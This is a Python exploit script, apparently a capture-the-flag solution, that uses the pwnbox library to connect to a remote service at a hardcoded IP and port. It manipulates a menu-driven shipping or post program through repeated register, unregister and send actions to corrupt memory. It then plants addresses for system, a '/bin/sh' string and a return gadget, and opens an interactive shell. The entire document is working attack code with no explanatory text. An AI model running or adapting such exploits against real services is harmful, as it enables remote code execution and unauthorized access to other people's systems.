import pwnbox,struct
pack = lambda x: struct.pack("<Q",x)
p = pwnbox.pipe.SocketPipe("110.10.212.136",4447) 
def register(name,phone,code,addr):
  p.read_until("->")
  p.write("1\n")
  for x in [name,phone,code,addr]:
    p.read_until("->")
    p.write(x+"\n")
 
def unregister():
  p.read_until("->")
  p.write("1\n")
  p.read_until("->")
  p.write("Y\n")

def create_post(idx,price,name,rec,phone,code,adr,pay):
  p.read_until("->")
  p.write("2\n")
  for x in [str(idx),str(price),name,rec,phone,code,adr,pay]:
    p.read_until("->")
    p.write(x+"\n")

def send_post(idx):
  p.read_until("->")
  p.write("4\n")
  p.read_until("->")
  p.write("%d\n"%idx)

def change(idx,ty,value):
  if ty==5:
    l =  ["3",str(idx),str(ty),value]
  else:
    l =  ["3",str(idx),str(ty)]
  for x in ["3",str(idx),str(ty),value]:
    p.read_until("->")
    p.write(x+"\n")

register("G"*0x9,"123","123","F"*87)
cnt = 2
for i in range(cnt):
  create_post(1,10,"name","C"*0x9,"123","123","123","Y")
unregister()
for i in range(cnt):
  send_post(0)
system = 0x4129b0
binsh = 0x4a8b5b
rip = 0x41297f
for i in range(8):
  register("\x5b\x8b\x4a","\x7f\x29\x41","\x5b\x8b\x4a","\x5b\x8b\x4a")
  unregister()
raw_input()
p.write("3\n1\n2\n")
p.interact()
